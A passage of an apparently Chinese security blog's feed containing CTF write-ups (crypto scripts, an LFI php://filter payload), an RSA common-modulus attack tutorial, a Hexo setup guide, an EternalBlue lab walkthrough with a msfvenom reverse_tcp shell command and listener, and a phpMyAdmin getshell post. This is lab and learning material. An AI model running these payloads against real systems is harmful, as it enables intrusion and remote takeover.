class="keyword">if</span> j &lt; <span class="number">10</span>:</div><div class="line">            j = <span class="string">'0'</span>+<span class="built_in">str</span>(j)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            j=<span class="built_in">str</span>(j)</div><div class="line">        <span class="built_in">key</span>=<span class="string">"1997"</span>+i+j</div><div class="line">        <span class="built_in">print</span> <span class="built_in">key</span></div><div class="line">        md5 = hashlib.md5(<span class="built_in">key</span>).hexdigest()</div><div class="line">        <span class="keyword">if</span> <span class="string">'0175501585710a89'</span> in md5:</div><div class="line">            <span class="built_in">print</span> <span class="built_in">key</span></div><div class="line">            <span class="built_in">print</span> md5</div></pre></td></tr></table></figure>
<h3 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h3><p>解密脚本<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="built_in">import</span> sys</div><div class="line"></div><div class="line"><span class="attr">s</span> = raw_input('String:\n')</div><div class="line"><span class="attr">a</span> = input('a:\n')</div><div class="line"><span class="attr">b</span> = input('b:\n')</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="attr">a==1:</span></div><div class="line">    <span class="attr">aa=1</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==3:</span></div><div class="line">    <span class="attr">aa=9</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==5:</span></div><div class="line">    <span class="attr">aa=21</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==7:</span></div><div class="line">    <span class="attr">aa=15</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==9:</span></div><div class="line">    <span class="attr">aa=3</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==11:</span></div><div class="line">    <span class="attr">aa=19</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==15:</span></div><div class="line">    <span class="attr">aa=7</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==17:</span></div><div class="line">    <span class="attr">aa=23</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==19:</span></div><div class="line">    <span class="attr">aa=11</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==21:</span></div><div class="line">    <span class="attr">aa=5</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==23:</span></div><div class="line">    <span class="attr">aa=17</span></div><div class="line"><span class="keyword">if</span> <span class="attr">a==25:</span></div><div class="line">    <span class="attr">aa=25</span></div><div class="line"></div><div class="line">for c <span class="keyword">in</span> s:</div><div class="line">    <span class="attr">c=chr((aa*(ord(c)-97-b))%26+97)</span></div><div class="line">    sys.stdout.write(c)</div></pre></td></tr></table></figure></p>
<h3 id="神奇的二维码"><a href="#神奇的二维码" class="headerlink" title="神奇的二维码"></a>神奇的二维码</h3><p>解密脚本<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="built_in">from</span> PIL import Image</div><div class="line">import re</div><div class="line"></div><div class="line">x = <span class="number">280</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></div><div class="line">y = <span class="number">280</span> <span class="comment">#y坐标  x*y = 行数</span></div><div class="line"></div><div class="line">im = Image.<span class="built_in">new</span>(<span class="string">"RGB"</span>,(x,y))<span class="comment">#创建图片</span></div><div class="line"><span class="built_in">file</span> = <span class="built_in">open</span>(<span class="string">'flag.txt'</span>) <span class="comment">#打开rbg值文件</span></div><div class="line"></div><div class="line"><span class="comment">#通过一个个rgb点生成图片</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</div><div class="line">        <span class="built_in">line</span> = <span class="built_in">file</span>.readline()<span class="comment">#获取一行</span></div><div class="line">        rgb = <span class="built_in">line</span>.<span class="built_in">split</span>(<span class="string">","</span>)<span class="comment">#分离rgb</span></div><div class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></div><div class="line">im.show()</div></pre></td></tr></table></figure></p>
<p>扫描二维码得到一传base64，然后栅栏解密，最后rot13</p>
<h3 id="神奇的图片"><a href="#神奇的图片" class="headerlink" title="神奇的图片"></a>神奇的图片</h3><p>提示了异或，脚本：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</div><div class="line">    flag_png=<span class="built_in">open</span>(<span class="string">"flag.png"</span>,<span class="string">"rb"</span>).<span class="built_in">read</span>(i)</div><div class="line">    png_key=<span class="built_in">open</span>(<span class="string">"xor.png"</span>,<span class="string">"rb"</span>).<span class="built_in">read</span>(i)</div><div class="line">    key=<span class="string">''</span>.join(chr(ord(<span class="keyword">a</span>)^ord(b)) <span class="keyword">for</span> <span class="keyword">a</span>,b <span class="keyword">in</span> zip(png_key,flag_png))</div><div class="line">    print key</div></pre></td></tr></table></figure></p>
<h3 id="铜牌靶机LFI"><a href="#铜牌靶机LFI" class="headerlink" title="铜牌靶机LFI"></a>铜牌靶机LFI</h3><p>伪协议，?key=php://filter/convert.base64-encode/resource=index 可以读任意php文件<br>文件泄露.DS_store，从文件中可知flag文件，利用伪协议读出</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;部分题目writeup&lt;/p&gt;
&lt;h3 id=&quot;base家族&quot;&gt;&lt;a href=&quot;#base家族&quot; class=&quot;headerlink&quot; title=&quot;base家族&quot;&gt;&lt;/a&gt;base家族&lt;/h3&gt;&lt;p&gt;base32和64交替加密，脚本泡一下&lt;br&gt;&lt;figure clas
    
    </summary>
    
    
      <category term="writeup" scheme="1ablades.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>欧几里德算法及扩展算法</title>
    <link href="1ablades.github.io/2017/08/10/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%B7%E7%AE%97%E6%B3%95%E5%8F%8A%E6%89%A9%E5%B1%95%E7%AE%97%E6%B3%95/"/>
    <id>1ablades.github.io/2017/08/10/欧几里德算法及扩展算法/</id>
    <published>2017-08-10T06:43:38.000Z</published>
    <updated>2017-08-10T06:45:47.488Z</updated>
    
    <content type="html"><![CDATA[<h2 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h2><p>又称碾转相除法，用于计算两整数a, b 的最大公约数。<br>初学C语言时写的代码：</p>
<pre><code>#include &lt;stdio.h&gt;
int main()
{
    int a,b,m,n,x;
    while(scanf(&quot;%d%d&quot;,&amp;a,&amp;b)!=EOF)
    {
        if(a==b)
            printf(&quot;%d %d\n&quot;,a,b);
        else if(a!=0&amp;&amp;b!=0)
        {
            x=1;
            if(a&gt;b)
            {
                m=a;
                n=b;
            }
            else if(a&lt;b)
            {
                m=b;
                n=a;
            }
            while(x!=0)
            {
                x=m%n;
                if(x!=0)
                {
                    m=n;
                    n=x;
                }
            }
            printf(&quot;%d %d\n&quot;,n,a*b/n);
        }
        else if(a==0&amp;&amp;b!=0)
            printf(&quot;%d %d\n&quot;,b,a);
        else if(a!=0&amp;&amp;b==0)
            printf(&quot;%d %d\n&quot;,a,b);

    }
    return 0;
}
</code></pre><p>原理依赖于下面定理：  </p>
<blockquote>
<p>两个整数的最大公约数等于其中较小的那个数和两数相除的最大公约数。</p>
</blockquote>
<p>证明：<br>设 a = kb +r， 则r = a mod b<br>假设d为a, b的一个公约数<br>r = kb - a<br>r/d = kb/d -  a/d<br>可知r/d为整数，因此d也是a, b, a%b的公约数， 则得证。</p>
<h2 id="欧几里得扩展算法"><a href="#欧几里得扩展算法" class="headerlink" title="欧几里得扩展算法"></a>欧几里得扩展算法</h2><p>这里是在学习RSA的共模攻击，所以复习一下欧几里得算法，但是关键是欧几里得算法扩展：  </p>
<blockquote>
<p>如果gcd(a, b) = c，则存在x, y，使得c = ax + by。</p>
</blockquote>
<p>证明：  </p>
<p>　　设 <code>a&gt;b</code><br>　　当 <code>b = 0</code>时，<code>gcd(a, b) = a</code>，此时<code>x = 1</code>, <code>y = 0</code>。<br>　　假设 <code>a*x1 + b*y1 = gcd(a, b)</code><br>　　则 <code>b*x2 + (a mod b)*y2 = gcd(b, a mod b)</code><br>　　根据 <code>gcd(a, b) = gcd(b, a mod b)</code>　　<br>　　可得 <code>a*x1 + b*y1 = b*x2 + (a mod b)*y2</code>　　<br>　　因为 <code>a mod b = a - (a/b)*b</code> //这里 ‘/‘ 是整除　　<br>　　所以 <code>a*x1 + b*y1 = b*x2 + (a - (a/b)*b)*y2</code>   　<br>　　　　　　　　　　　<code>= b*x2 + a*y2 - (a/b)*b*y2</code><br>　　　　　　 <code>gcd(a, b)      = a*y2 + b*(x2 - (a/b)*y2)</code><br>　　对比 <code>a*x1 + b*y1 = gcd(a, b)</code>　　<br>　　发现 <code>x1 = y2</code><br>　　　 　 <code>y1 = x2 - (a/b)*y2</code>　　</p>
<p>算法代码如下：  </p>
<pre><code>int e_gcd(int a, int b, int x, int y){
    if(b == 0){
        x = 1;
        y = 0;
        return a;
    }
    int ans = e_gcd(b, a%b, x, y);
    int t = x;
    x = y;
    y = x - (a/b)*y;
    return ans;
}
</code></pre><p>扩展欧几里德算法不但能计算<code>gcd(a, b)</code>，还可以求解形如<code>a*x + b*y = c</code> 的通解，但是求通解吊意思也没，所以这里来求一个特殊的解，乘法逆元。</p>
<h2 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h2><h5 id="什么叫乘法逆元？"><a href="#什么叫乘法逆元？" class="headerlink" title="什么叫乘法逆元？"></a>什么叫乘法逆元？</h5><p>形如<code>ax≡1(mod b)</code><br>我们称x是a关于f的乘法逆元，还有另一种表达式：  </p>
<pre><code>a*x + b*y = 1  
</code></pre><p>也就是<code>gcd(a, b) = 1</code></p>
<p>在<a href="https://1ablades.github.io/2017/08/09/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/">RSA共模攻击</a>中，求乘法逆元函数如下</p>
<pre><code>def egcd(a, b):
    if a == 0:
          return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;欧几里得算法&quot;&gt;&lt;a href=&quot;#欧几里得算法&quot; class=&quot;headerlink&quot; title=&quot;欧几里得算法&quot;&gt;&lt;/a&gt;欧几里得算法&lt;/h2&gt;&lt;p&gt;又称碾转相除法，用于计算两整数a, b 的最大公约数。&lt;br&gt;初学C语言时写的代码：&lt;/p&gt;
&lt;pre&gt;&lt;c
    
    </summary>
    
    
      <category term="算法" scheme="1ablades.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>RSA共模攻击</title>
    <link href="1ablades.github.io/2017/08/09/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
    <id>1ablades.github.io/2017/08/09/RSA共模攻击/</id>
    <published>2017-08-09T07:04:27.000Z</published>
    <updated>2017-08-10T06:46:34.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>RSA为一种加密算法，公钥加密，私钥解密。<br>算法涉及三个参数，<code>n</code>、<code>e1</code>、<code>e2</code>。其中n为两个大质数<code>p</code>、<code>q</code>的积，<code>n</code>的二进制表示密钥所占用位数，就是密钥长度。<code>e1</code>可以随意取，但条件是<code>e1与(p-1)*(q-1)</code>互质，然后<code>e2</code>要求<code>(e2*e1)mod((p-1)*(q-1))=1</code>。    </p>
<p>加解密算法：<br>A为明文，B为密文，则：<code>B=A^e2 mod n</code>; <code>B=A^e1 mod n</code>。</p>
<h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>假设 有一条信息m，用公钥加密信息(使用了相同的模数n)：</p>
<pre><code>c1 = m^e1 mod n
c2 = m^e2 mod n
</code></pre><p>可以利用密钥d1，d2来解密：</p>
<pre><code>m = c1^d1 mod n
m = c2^d2 mod n
</code></pre><p>此时如果有一个攻击者，得到了密文<code>c1</code>、<code>c2</code>，因为公钥公开，而模数相同，攻击者姐可以破解密文获得信息。<br>此时已知信息：<br><code>c1</code>, <code>c2</code>, <code>e1</code>, <code>e2</code>, <code>n</code>  </p>
<pre><code>gcd(e1, e2) = 1
m = c1^d1 mod n
m = c2^d2 mod n
</code></pre><p>求出m。  </p>
<p>接下来就到了高数时间。<br><code>e1</code>,<code>e2</code>互质</p>
<pre><code>gcd(e1,e2)=1
</code></pre><p>则有  </p>
<pre><code>e1*s1 + e2*s2 = 1
</code></pre><p>这里涉及到欧几里德扩展算法，可以看我另一篇文章： <a href="https://1ablades.github.io/2017/08/10/%e6%ac%a7%e5%87%a0%e9%87%8c%e5%be%b7%e7%ae%97%e6%b3%95%e5%8f%8a%e6%89%a9%e5%b1%95%e7%ae%97%e6%b3%95/">欧几里德算法及扩展算法</a><br>因为  </p>
<pre><code>c1 = m^e1 mod n
c2 = m^e2 mod n  
</code></pre><p>所以</p>
<pre><code>(c1^s1*c2^s2) mod n = ((m^e1 mod n)^s1*(m^e2 mod n)^s2) mod n
</code></pre><p>即</p>
<pre><code>(c1^s1*c2^s2) mod n = (m^(e1^s1 + e2^s2)) mod n
</code></pre><p>所以</p>
<pre><code>(c1^s1*c2^s2) mod n = (m^(1)) mod n
</code></pre><p>即</p>
<pre><code>c1^s1*c2^s2= m
</code></pre><p>得证，可求出m。</p>
<ul>
<li>注意：<br>  从前面的式子<code>e1*s1 + e2*s2 = 1</code>可以知道，<code>s1</code>、<code>s2</code>中有一个为负数，而负数次幂运算，比如这里求<code>c2</code>的<code>s2</code>次幂，需要先计算c2的模反元素<code>c2r</code>，然后再求<code>c2r</code>的<code>-s2</code>次幂。</li>
</ul>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>这里我找一个CTF的例子<br><a href="http://www.shiyanbar.com/ctf/1834" target="_blank" rel="external">http://www.shiyanbar.com/ctf/1834</a><br>首先分析一下数据，发现n都是相同的，由此联想到共模攻击。<br>先写一个脚本找出两组e互质的数据：  </p>
<pre><code># coding=utf-8
# author : 1ABlades

import re, os

base_dir = os.path.dirname(__file__)
f = open(base_dir + &quot;\data.txt&quot;, &apos;r&apos;)
str = f.read()

reobj = re.compile(&quot;\: 0x(\w+)L* \:&quot;)
e = reobj.findall(str)

n = 0
for i in e:
n = n+1
m = 0
for j in e:
    m = m + 1
    for p in i:
        if p==&apos;L&apos;:
            i = i[:-1]
    for q in j:
        if q==&apos;L&apos;:
            j = j[:-1]
    a = int(i,16)
    b = int(j,16)
    if(a&lt;=0 or b&lt;=0 or a==b):
        continue
    elif(a==1 or b==1):
        print i + &quot;and&quot; + j
    else:
        if a &lt; b:
            t = a
            a = b
            b = t
        while 1:
            t = a%b
            if t==0:
                break
            else:
                a = b
                b = t
        if b&gt;1:
            continue
        else:
            print &apos;group&apos;,n ,&apos;and&apos;, m ,&apos;: &apos; + i + &quot;  &quot; + j
</code></pre><p>找出第9和19组数据，写脚本进行破解：</p>
<pre><code># -*- coding: utf-8 -*-
# author ：Swing   bolg: www.wing3.cn

from libnum import n2s,s2n
from gmpy2 import invert

def egcd(a, b):
if a == 0:
    return (b, 0, 1)
else:
    g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)

def main():
    n = int(&apos;a5f7f8aaa82921f70aad9ece4eb77b62112f51ac2be75910b3137a28d22d7ef3be3d734dabb9d853221f1a17b1afb956a50236a7e858569cdfec3edf350e1f88ad13c1efdd1e98b151ce2a207e5d8b6ab31c2b66e6114b1d5384c5fa0aad92cc079965d4127339847477877d0a057335e2a761562d2d56f1bebb21374b729743&apos;,16)
    c1 = int(&apos;6fdcbfb5cd2cacd032ef7200fd49b9f304a6dbd8399f4a91a72d1d9150f97b3b513f44dfc56f6f7c8ec41a8ef9b93a80230a1e65e29d2ef519bb83931d4b0c7a589059cfdf2d571660ab790a9c7e085e3018bf19748abd6d521952b68bc9594c1ad34726658bd9bd445d3b6381ceee57328838e8a129867e505be0ca0d1a1da5&apos;,16)
    c2 = int(&apos;8caeaa7d272f9606fee9222efd1d922143db738b95bd64746b27bc4c0fd979a2c57b4735131a4391a81bf5f0c0c8eea41d4f91bed4d17784b1956fd89882b97c98009051ac3a03964499c864524d3ddc10299c0290e91707b62ce89b118afe558151be39d61de0483def52c6cb546132ecab85143715bc593a2892b1e41b37b9&apos;,16)
    e1 = int(&apos;6b8a5ae7&apos;,16)
    e2 = int(&apos;4042c3955&apos;,16)
    s = egcd(e1, e2)
    s1 = s[1]
    s2 = s[2]
    # 求模反元素
    if s1&lt;0:
        s1 = - s1
        c1 = invert(c1, n)
    elif s2&lt;0:
        s2 = - s2
        c2 = invert(c2, n)

    m = pow(c1,s1,n)*pow(c2,s2,n) % n
    print n2s(m)

if __name__ == &apos;__main__&apos;:
  main()
</code></pre><h5 id="referer"><a href="#referer" class="headerlink" title="referer:"></a>referer:</h5><ul>
<li><a href="http://baike.baidu.com/link?url=4j6REyjazQ04yJ9y0N1FAjtD5VuCudas6OwMVKlvfyzHQTvgpEv_jYiIwt6g0CzJw0o9UfWDD1P4c1d4jne9qbNh8pstrGVML46AHBICrJeVqfjPcq1NHvZmbmKnf-4yX-qSivrS_LhcfctVch5jF_#3_1" target="_blank" rel="external">http://baike.baidu.com/link?url=4j6REyjazQ04yJ9y0N1FAjtD5VuCudas6OwMVKlvfyzHQTvgpEv_jYiIwt6g0CzJw0o9UfWDD1P4c1d4jne9qbNh8pstrGVML46AHBICrJeVqfjPcq1NHvZmbmKnf-4yX-qSivrS_LhcfctVch5jF_#3_1</a>  </li>
<li><a href="http://www.tuicool.com/articles/IzuYfu" target="_blank" rel="external">http://www.tuicool.com/articles/IzuYfu</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;RSA&quot;&gt;&lt;a href=&quot;#RSA&quot; class=&quot;headerlink&quot; title=&quot;RSA&quot;&gt;&lt;/a&gt;RSA&lt;/h2&gt;&lt;p&gt;RSA为一种加密算法，公钥加密，私钥解密。&lt;br&gt;算法涉及三个参数，&lt;code&gt;n&lt;/code&gt;、&lt;code&gt;e1&lt;/code&gt;、&lt;
    
    </summary>
    
    
      <category term="密码学" scheme="1ablades.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>hexo+github blog搭建</title>
    <link href="1ablades.github.io/2017/08/08/hexo-github-blog%E6%90%AD%E5%BB%BA/"/>
    <id>1ablades.github.io/2017/08/08/hexo-github-blog搭建/</id>
    <published>2017-08-08T08:59:36.000Z</published>
    <updated>2017-08-09T01:29:08.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>因为之前blog用的腾讯云，需要审核，没审核就关掉了，然后就一直没写博客，最近买了台搬瓦工，洛杉矶19.9刀一年，就想把blog再搭起来。<br>之前用的typecho，这次选一个静态的，hexo+github 还省了域名钱。</p>
<h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>我的主机是centos7系统，就只搭了一个ssr<br>全过程都是root用户，但是是在一个普通用户的家目录里安装的hexo</p>
<h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><p>~目录下，下载nvm  </p>
<p><code>git clone https://github.com/cnpm/nvm.git &amp;&amp; cd nvm &amp;&amp; sh ./install.sh ; source $HOME/nvm/nvm.sh ; source $HOME/.nvm/nvm.sh</code> </p>
<pre><code>nvm install v4.2.0
nvm use v4.2.0
</code></pre><p>切换nvm版本<br>我用的4.2.0</p>
<h1 id="0x02-安全及配置"><a href="#0x02-安全及配置" class="headerlink" title="0x02 安全及配置"></a>0x02 安全及配置</h1><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code>npm install -g hexo
mkdir /home/1ablades/hexo &amp;&amp; hexo init /home/1ablades/hexo
</code></pre><h3 id="设置git"><a href="#设置git" class="headerlink" title="设置git"></a>设置git</h3><p>配置文件_config.yml</p>
<blockquote>
<p># Deployment 这里设置了Git获<br>#这里一定要注意不要写错了，否则部署到Github上会出问题#<br># Docs: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">https://hexo.io/docs/deployment.html</a><br>deploy:<br>    type: git<br>    repo: git@github.com:xxx/xxx.github.io.git<br>    branch: master<br>    message: ‘站点更新:&#123;&#123;now&#40;”YYYY-MM-DD HH/mm/ss”&#41;&#125;&amp;#125’  </p>
</blockquote>
<pre><code>git config --global user.email &quot;you@example.com&quot;
git config --global user.name &quot;Your Name&quot;
</code></pre><p>生成ssh密钥</p>
<pre><code>ssh-keygen -t rsa -C example@126.com
</code></pre><p>将<br>less ~/.ssh/id_rsa.pub<br>的代码复制粘贴到github setting的ssh密钥设置中</p>
<ul>
<li>注意：这里的ssh密钥一定要是你系统进行操作的用户的密钥</li>
</ul>
<h3 id="创建blog工程"><a href="#创建blog工程" class="headerlink" title="创建blog工程"></a>创建blog工程</h3><p>在github上创建项目 用户名.github.io</p>
<h1 id="0x03-运行及上传"><a href="#0x03-运行及上传" class="headerlink" title="0x03 运行及上传"></a>0x03 运行及上传</h1><h3 id="编译及运行blog"><a href="#编译及运行blog" class="headerlink" title="编译及运行blog"></a>编译及运行blog</h3><pre><code>hexo generate
hexo d
</code></pre><p>访问 <a href="http://用户名.github.io" target="_blank" rel="external">http://用户名.github.io</a><br>就可以看到你的blog啦</p>
<h3 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h3><p>在hexo目录下</p>
<pre><code>hexo new &quot;文章题目&quot;
</code></pre><p>创建文章，为markdown格式</p>
<h1 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h1><h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="external">http://theme-next.iissnan.com/getting-started.html</a><br><a href="https://hexo.io/themes/" target="_blank" rel="external">https://hexo.io/themes/</a></p>
<h3 id="github上传项目"><a href="#github上传项目" class="headerlink" title="github上传项目"></a>github上传项目</h3><p>windows下载git<br>在项目目录右键进入bash  </p>
<pre><code>git clone https://github/xxx/xxx.git
</code></pre><p>将项目内容复制到xxx<br>bash中进入xxx  </p>
<pre><code>git add .
git commit -m &quot;信息&quot;
git push -u origin master
</code></pre><p>在这之前要设置git用户</p>
<h3 id="hexo常见错误"><a href="#hexo常见错误" class="headerlink" title="hexo常见错误"></a>hexo常见错误</h3><p>在我上传这篇文章hexo generate的时候，hexo给我报了两个错。<br>第一个是now&#40;&#41;,小括号属于特殊字<br>符，在编译时将now作为函数处理了。<br>解决办法就是将小括号利用<code>&amp;#40;</code>,<code>&amp;#41;</code>进行转义。  </p>
<p>第二个错误是大括号&#123; &#125;，同样需要转义<code>&amp;#123;</code>,<code>&amp;#125;</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;因为之前blog用的腾讯云，需要审核，没审核就关掉了，然后就一直没写博客，最近买了台搬瓦工，洛杉矶1
    
    </summary>
    
    
      <category term="Linux" scheme="1ablades.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>ShadowBrokers漏洞利用工具使用（1）</title>
    <link href="1ablades.github.io/2017/04/19/ShadowBrokers%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%881%EF%BC%89/"/>
    <id>1ablades.github.io/2017/04/19/ShadowBrokers漏洞利用工具使用（1）/</id>
    <published>2017-04-19T07:43:23.000Z</published>
    <updated>2017-08-09T01:00:57.114Z</updated>
    
    <content type="html"><![CDATA[<p>FuzzBunch之Eternalblue</p>
<p>利用MS17-010漏洞 入侵winxp win server 2008 或 win7。<br>最近方程式组织爆出漏洞以及shadowbrokers放出的工具搞得沸沸扬扬，本篇的工具shadowbrokers早在12年就已经写出来了，有点可怕。<br>附上工具链接<br>链接：<a href="http://pan.baidu.com/s/1ge2RFVH" target="_blank" rel="external">http://pan.baidu.com/s/1ge2RFVH</a> 密码：0dtr</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul>
<li>win7     攻击机   192.168.226.128    环境需要python2.6.6以及pywin32</li>
<li>winxp    靶机     192.168.226.130    开启SMB服务 445端口 建议关闭防火墙</li>
<li>kali2             192.168.226.136    用来生成攻击payload和反弹shell</li>
</ul>
<h3 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h3><p>将windows目录拷贝到攻击机win7上，在目录下建立文件夹listeningposts</p>
<p>运行fb.py</p>
<p><img src="http://123.206.81.232/img/eternalblue/fb_1.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/eternalblue/fb_2.png" alt="请输入图片描述"></p>
<p>日志就放在windows下有个log_dirs<br>之后会询问new project name 就是日志文件名称</p>
<p>然后执行</p>
<pre><code>use ETERNALBLUE
</code></pre><p>一路回车直到</p>
<p><img src="http://123.206.81.232/img/eternalblue/fb_3.png" alt="请输入图片描述"></p>
<p>这里mode选择1 使用常规部署方式 也就是在靶机上建立后门 带有模糊测试</p>
<p>然后一路回车</p>
<p><img src="http://123.206.81.232/img/eternalblue/fb_4.png" alt="请输入图片描述"></p>
<p>执行成功</p>
<p>然后我们到kali2下用msf生成用于反弹shell的dll</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=8089 -f dll &gt; reverser_tcp.dll
</code></pre><p>将reverser_tcp.dll文件拷贝到win7的C盘根目录下<br>在msf下开启msfpayload监听</p>
<pre><code>msfconsole

msf &gt;   use exploit/multi/handler
        set LHOST 192.168.226.136
        set LPORT 8089
        set PAYLOAD windows/meterpreter/reverse_tcp
        exploit
</code></pre><p><img src="http://123.206.81.232/img/eternalblue/fb_5.png" alt="请输入图片描述"></p>
<p>然后在winxp中执行</p>
<pre><code>use DOUBLEPULSAR
</code></pre><p><img src="http://123.206.81.232/img/eternalblue/fb_6.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/eternalblue/fb_7.png" alt="请输入图片描述"></p>
<p>利用成功</p>
<p><img src="http://123.206.81.232/img/eternalblue/fb_8.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/eternalblue/fb_9.png" alt="请输入图片描述"></p>
<p>成功控制靶机</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;FuzzBunch之Eternalblue&lt;/p&gt;
&lt;p&gt;利用MS17-010漏洞 入侵winxp win server 2008 或 win7。&lt;br&gt;最近方程式组织爆出漏洞以及shadowbrokers放出的工具搞得沸沸扬扬，本篇的工具shadowbrokers早在12
    
    </summary>
    
    
      <category term="Web安全" scheme="1ablades.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin getshell</title>
    <link href="1ablades.github.io/2017/04/11/phpMyAdmin-getshell/"/>
    <id>1ablades.github.io/2017/04/11/phpMyAdmin-getshell/</id>
    <published>2017-04-11T07:41:13.000Z</published>
    <updated>2017-08-08T07:42:32.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Win XP<br>Apache 2.0<br>PHP 5.3.29<br>MySQL 5.0.8-dev</p>
<p>条件：<br>    拥有MySQL的root权限</p>
<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先我们以root登陆phpMyAdmin<br>试一下利用OUT INTOFILE来getshell</p>
<p><img src="http://123.206.81.232/img/phpmyadmin_getshell/1.png" alt="请输入图片描述"></p>
<p>执行以上语句，会发现已经写入了小马</p>
<p><img src="http://123.206.81.232/img/phpmyadmin_getshell/2.png" alt="请输入图片描述"></p>
